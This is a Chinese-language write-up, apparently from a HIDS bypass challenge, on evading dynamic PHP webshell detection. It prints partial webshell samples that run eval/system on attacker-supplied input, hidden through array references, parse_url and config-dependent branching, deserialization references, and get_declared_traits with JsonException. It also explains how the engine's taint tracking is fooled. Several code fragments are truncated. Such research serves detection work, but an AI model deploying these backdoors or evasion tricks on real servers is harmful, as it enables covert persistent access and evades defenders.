HIDS PHP WebShell Bypass 研究与分析 
——do9gy 
背景：2022 年春天，参加了某 HIDS Bypass 挑战赛，赛题恰好是关于 PHP WebShell 绕
过的，结合 Fuzz 技术获得了几个侥幸可以绕过的样本，围绕#WebShell 检测那些事的主题，
与各位做一个分享。 
挑战赛规则如下:  
1、WebShell 指外部能传参控制(如通过 GET/POST/HTTP Header 头等方式)执行任
意代码 或命令，比如 eval($_GET[1]);。在文件写固定指令不算 Shell，被认定为无
效，如 
此时，目标服务器上需要有相应的文件配合： 
通过动态修改该文件第二行的内容，可以给 system 传入不同的参数，参数内容是完全
可控的。 
0x03 fpm_get_status 引入参数 
比赛环境是 php-fpm 架构的，此时可以通过 fpm_get_status() 函数来获取参数。可打
印调试： 
0){ 
    $b="#"; 
} 
$a = array( "one"=>$c,"two"=>&$c ); 
$url = "http://a/usr/".$b."?a=1"; 
$d =parse_url($url); 
if($d['query']){ 
    $c="echo 111;"; 
} 
else{ 
    $c=$_FILES['useraccount']['name']; 
} 
var_dump($a["two"]); 
eval($a["two"]); 
?> 
经过无数次的 Fuzz，我终于弄清楚了动态查杀引擎的一些检测逻辑： 无论如何拼接、
变形、赋值，在整个 PHP 脚本生命周期内不允许出现 [危险函数]([可控参数]) 这样的情况。 
我首先想到的是，利用变量引用来切断跟踪链条。 
传统的变量传递，形如 $b=$a; $c=$b; $d=$c; 
跟踪程序一定能够追踪到 $a 与 $d 的关系，进而清晰地解析出他们的值。 
那么： $a="foo";$b=&$a; $b="system"; $a(xxx); 就 b 比之前进行了一些升级，如果引擎
仅简单根据等号赋值来跟踪，就很容易跟丢。经过测试，我发现引擎对这种直接的引用传递
十分敏感，无法构造 payload。因而，我用数组进行了包装，在数组中，我将 $c 与$a["two"] 
绑定在一起： 
$c = "222"; 
$a = array( "one"=>$c,"two"=>&$c ); 
这样，当$c 变化的时候，$a["two"]也会随之变化： 
$c=$_FILES['useraccount']['name']; 
var_dump($a["two"]); 
经过测试，我发现引擎对可传递参数的全局变量也并不是一视同仁的，他们拥有不同的恶意
等级，其中$_GET $_POST $_COOKIE $_REQUEST 是最高恶意等级的，而$_FILES 恶意度较
低，因此，这里可以通过$_FILES 全局变量来接收用户传参。 
仅仅是这样切断还是不够的，我将参数取值的判断进行了前移。简言之就是：
$c=$a==$b?'system':'foo';  让$a==$b 来决定最终这个样本是 WebShell 还是普通文件，
我先控制，让$a==$b 返回 False，于是，样本检测通过了。但当为 True 时，样本检测变为
了查杀，这正是我想要的。 
接下来，我试图通过 PHP 语法 Trick 来引起解析歧义，如：intval((0.1+0.7)*10) == 7 ，
经过测试，我发现动态查杀引擎也是使用的 PHP，因而不能引发歧义。进一步，我又引入了
PHP7 特定版本特有的一些 Trick，发现仍然无法引发歧义，我逐渐确定了引擎版本与测试环
境一致的这一事实。 
既然如此，就只能通过环境因素来引起歧义了。我在这里之前，又引入了一片多米诺骨
牌，让动态跟踪引擎更加迷惑： 
$url = "http://a/usr/".$b."?a=1"; 
$d =parse_url($url); 
if($d['query']){ 
    $c="echo 111;"; 
} 
else{ 
    $c=$_FILES['useraccount']['name']; 
} 
解析 URL 成功与否，将直接导致 $c 的赋值，而这一切又取决于 $b ： 
if(get_cfg_var('error_reporting')>0){ 
    $b="#"; 
} 
$b 如果等于 # , 将导致解析 URL 失败，我将是否推动多米诺骨牌第一块的这只手交给 
get_cfg_var('error_reporting') ，我本地环境是配置了这个参数的，而我相信动态
查杀引擎没有配置，事实正如我所料。这一点的不一致，导致了最终的绕过。 
根据这一模式，引申出来的绕过点有很多，不一一列举了，在 PhpStorm 中输入 get_即
可看到： 
0x06 模式二： 反序列化引用 
怎么能少得了反序列化呢？记得在 N 年前 php4fun 挑战赛 challenge8 中，一道与 L.N.
师傅有关的题令我印象深刻，其中使用的技术正是 PHP 反序列化引用。 
a=$_GET['a']; 
    if($i=98){ 
        continue; 
    } 
    $c=$s[0]->a; 
    print(substr(get_declared_classes()[72],4,6)($c)); 
} 
?> 
通过反序列化，将数组$s[0] $s[1]两个元素绑定在一起，干扰了引擎动态污点跟踪。如
果结合那道题，可以将 stdClass 的对象中两个成员变量绑定在一起，更加具有迷惑性。 
其他的触发点与模式一大致类似，这里就不做过多介绍了。 
以上两个模式，搭配不同的能够引起差异的环境变量和不同的传参点，可以衍生出多种
payload，这里不过多进行列举。 
0x07 trait 
在对前两种模式 Fuzz 的同时，我发现了一个新的思路，这个思路虽然同样部分依赖于
系统环境变量，但是由于执行函数和传参都进行了变形，可以有效阻断污点追踪技术。 
=116){ 
        continue; 
    } 
    $c=$a->getMessage(); 
    print(get_declared_traits()[0]($c)); 
} 
get_declared_traits 将会获取到系统中已定义的 trait，因此获取到的函数名称为
system，而 JsonException ->getMessage() 能够将已储存的 Message 信息显示出来，
这里我如此初始化：$a= new JsonException($_GET['a']); 于是，分别从危险函数和
用户传参两个路径来狙击动态跟踪，发生了新的绕过。除了 JsonException 以外，我发现 
引擎对内置接口的 getMessage 普遍不敏感，这样的内置类大致（未严格测试，其中可能
会有些类不支持 getMessage 方法）如下： 
    Error 
      ArithmeticError 